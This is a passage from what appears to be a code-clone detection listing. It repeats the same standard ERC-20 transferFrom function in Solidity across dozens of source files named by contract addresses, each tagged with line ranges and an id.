        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="90" endline="99" pcid="2662">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0b84Fa92739e6704EEb6658AfdA59747215B496A.sol" startline="88" endline="97" pcid="311">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x747e3327A6Ca70475035e0D07f48C5E986bdD912.sol" startline="84" endline="93" pcid="4289">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5b80d34d9b91f7e424d4fb73aba7cf5647ead8fa.sol" startline="89" endline="98" pcid="3490">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="86" endline="95" pcid="3475">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="80" endline="89" pcid="2304">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="88" endline="97" pcid="9335">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="89" endline="98" pcid="7640">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="89" endline="98" pcid="808">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="89" endline="98" pcid="3392">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ad359AaC713929412c9b802175A9f12E5cf9306.sol" startline="86" endline="95" pcid="3460">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5ABbDae4e6d7c89640129E87409C8F991CeE5174.sol" startline="89" endline="98" pcid="3445">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xff5c2d7Ea91Cb2a88e58E840f24088B5b445834A.sol" startline="89" endline="98" pcid="9350">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x5aa699e74fb24d7f1d04e2392df05133da7cadc7.sol" startline="89" endline="98" pcid="3430">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xCDFcbB5be93d37A33C85ffd7828dDDd332823349.sol" startline="85" endline="94" pcid="7315">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="88" endline="97" pcid="2188">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="87" endline="96" pcid="5613">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xfFc50B460871D6dF13CA15F24c29cB646B6606f5.sol" startline="89" endline="98" pcid="9365">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe75e3c43e328F92a66e787b5e4B81f5A271a78a5.sol" startline="85" endline="94" pcid="8353">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x46a9D15f23306E44060fb3558CDF051dD9D83FA9.sol" startline="87" endline="96" pcid="2647">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x690C351f059c4963362cB75AAb802A2b95bA2B0C.sol" startline="85" endline="94" pcid="3909">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="89" endline="98" pcid="7670">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="88" endline="97" pcid="7169">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="87" endline="96" pcid="2173">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="88" endline="97" pcid="2139">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30c12bcdd3f52ec30ed4686de301e710e862eb55.sol" startline="87" endline="96" pcid="1528">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa23e76262e6617dab8caadd452d0f428201267e1.sol" startline="94" endline="103" pcid="5853">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="86" endline="95" pcid="3930">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x7bb08a75ea1D11298c6A3fF2A638153C96792C93.sol" startline="89" endline="98" pcid="4649">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb628B6198E2320437e8a9FF1e72A9FF3f1636cf9.sol" startline="92" endline="101" pcid="6632">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="89" endline="98" pcid="6899">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xaD143dB1c4F95b7d90aA399fc45fAbd56a9Ab521.sol" startline="87" endline="96" pcid="6253">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="705" endline="714" pcid="2218">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="90" endline="99" pcid="1513">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x802684855737ba75aBF906709cD1516817Ef7C74.sol" startline="90" endline="99" pcid="4746">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xccD47BEeEf5E57708853902581289A950E4E9722.sol" startline="87" endline="96" pcid="7284">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="90" endline="99" pcid="5693">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xEC55D39A13F31B2674EFD7662bB7Debeb1B65948.sol" startline="88" endline="97" pcid="8603">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3711A137D43779d8352624aF0852948434B13ad7.sol" startline="89" endline="98" pcid="1850">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdd160949e087Ef040BbFde43E454BA45dF2E8B52.sol" startline="90" endline="99" pcid="7864">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="84" endline="93" pcid="8398">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="86" endline="95" pcid="4259">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="87" endline="96" pcid="6283">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="83" endline="92" pcid="5006">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="89" endline="98" pcid="6647">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa42284f1617bc85bd6c0139f9482b0908ee42915.sol" startline="87" endline="96" pcid="5965">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="90" endline="99" pcid="4005">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3505c70Dbf2Cc4ECD84Dd0Bed04f8126c26Ab909.sol" startline="92" endline="101" pcid="1671">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0232d83E731fB812b8A9A0497b75c73a1bC7655a.sol" startline="91" endline="100" pcid="85">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="85" endline="94" pcid="8458">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x89C8Eb764Ae4e7EF67f5E84f0eeE404a2Fb02bed.sol" startline="91" endline="100" pcid="5111">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="87" endline="96" pcid="1225">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6277c6BC834f6A1cCa9905696a5b6d4f459BC736.sol" startline="89" endline="98" pcid="3763">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="86" endline="95" pcid="5708">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0934865C5546d21B4fD998bd5E1D3a5cD351D961.sol" startline="89" endline="98" pcid="266">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xd5e370D59C687fcB30943607C3E8f9249ee68619.sol" startline="85" endline="94" pcid="7655">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="84" endline="93" pcid="5678">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="88" endline="97" pcid="5472">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="85" endline="94" pcid="5723">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="83" endline="92" pcid="1434">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD1E4a04142D5B5174C6E7129C11740F73d721f5A.sol" startline="86" endline="95" pcid="7506">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="184" endline="193" pcid="7372">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xFB1eef96272C53D608d11de7a92B1e7a0abF7DFc.sol" startline="90" endline="99" pcid="9133">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x13aa62cE2b990807c069d04A61E8475c45a150E5.sol" startline="87" endline="96" pcid="522">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xdCfb3170A71BE65d6Ae3d70F7B617fa2B467975f.sol" startline="85" endline="94" pcid="7839">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="86" endline="95" pcid="5663">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="178" endline="187" pcid="3945">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3c9176ca5edd24a65e938e37729e717a3776ed06.sol" startline="84" endline="93" pcid="2151">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="85" endline="94" pcid="3888">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x0d78d64e0889d8199001868faf1542c90cac768c.sol" startline="190" endline="199" pcid="380">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x957611a96e326c3b8aEa24B545Cd84bA72Ff0A9d.sol" startline="86" endline="95" pcid="5422">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x3943a56c7b1efd43c3c952aec05cb295f0ab8c67.sol" startline="83" endline="92" pcid="1903">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x821d158c454B3a3Fcef1B9f35DBa9cb0e37C5453.sol" startline="88" endline="97" pcid="4861">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="91" endline="100" pcid="5066">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x613D596e4500c1538214bf023e3151DaA7555E97.sol" startline="83" endline="92" pcid="3731">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="87" endline="96" pcid="1419">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="89" endline="98" pcid="194">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x24F678d0E7E6Cf58d7aB828e13E7DE2EF15cDb60.sol" startline="86" endline="95" pcid="1165">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="88" endline="97" pcid="6093">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="87" endline="96" pcid="1187">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="86" endline="95" pcid="5929">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x22E7f1B1300DBd955C689ac4Da292f938A4AEBFA.sol" startline="87" endline="96" pcid="1054">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="92" endline="101" pcid="6108">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x6301C00FADD94F10409FC62E08215253fB838F46.sol" startline="86" endline="95" pcid="3778">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="90" endline="99" pcid="4274">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x77b3e393d8BC4ee7a6d0afff7eDeE5c449E61852.sol" startline="87" endline="96" pcid="4495">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x892128b76b80C251F79B8F2E2fa300eE7546831A.sol" startline="86" endline="95" pcid="5096">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xb5c5017c98549049c1d1Cf46e3d0eA7882a21B33.sol" startline="89" endline="98" pcid="6615">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="85" endline="94" pcid="6139">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="86" endline="95" pcid="1039">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="85" endline="94" pcid="7625">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xe0292d64ff7319abd8083e2bdae5ba81a56ada05.sol" startline="72" endline="81" pcid="8051">
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual  returns (bool) {
        address spender = msg.sender;
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }
</source>
<source file="systems/source-code/0xE8EE7f2c7e487F6Cf4424FE4589a37883986c402.sol" startline="90" endline="99" pcid="8413">
    function transferFrom(
        address from,
        address to,
